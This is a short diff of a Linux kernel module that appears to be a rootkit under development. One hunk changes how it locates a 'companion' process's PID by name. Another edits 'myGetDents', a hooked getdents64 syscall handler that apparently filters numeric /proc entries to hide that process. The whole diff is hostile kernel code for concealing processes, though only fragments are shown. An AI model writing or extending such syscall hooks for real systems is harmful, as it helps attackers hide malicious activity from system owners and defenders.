@@ -14,7 +14,7 @@ void get_pid_companion(void) {
     pid_t pid_buff = -1;
     printk(KERN_INFO "PLEASE");
     for_each_process(task) {
-      if (!strcmp(task->comm, "companion")) {
+      if (!strcmp(task->comm, "/bin/companion")) {
         g_pid_companion = task->pid;
         printk(KERN_INFO "PLEASE2");
         break ;
@@ -117,7 +117,7 @@ static bool is_numeric(char *str) {
 
 asmlinkage long myGetDents(const struct pt_regs *regs) {
 
-    printk(KERN_INFO "Hello there\n");
+    // printk(KERN_INFO "Hello there\n");
     int dirent_idx = 0;
     int buff_pid = -1;
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
